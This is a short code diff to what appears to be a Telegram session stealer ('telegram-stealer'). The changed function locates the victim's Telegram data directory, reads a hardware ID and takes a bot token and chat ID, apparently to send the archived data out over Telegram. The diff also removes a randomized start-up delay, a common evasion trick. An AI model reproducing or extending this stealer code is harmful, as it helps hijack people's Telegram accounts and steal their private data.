@@ -159,19 +159,10 @@ function deleteArchive(archivePath) {
  * @param {string} telegramChatId
  * @param {string} telegramToken
  * @param {string} archivePassword
- * @param {boolean} waitOnStart
  */
-async function run(
-  telegramChatId,
-  telegramToken,
-  archivePassword = 'https://github.com/rigwild/telegram-stealer',
-  waitOnStart = true
-) {
+async function run(telegramChatId, telegramToken, archivePassword = 'https://github.com/rigwild/telegram-stealer') {
   if (!telegramChatId) throw new Error('Telegram chat ID is required')
   if (!telegramToken) throw new Error('Telegram token is required')
-
-  // Wait before execution
-  if (waitOnStart) await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 5000 + 3000)))
 
   const telegramDirectoryPath = await findTelegramDirectoryPath()
   const hwid = await getHwid()
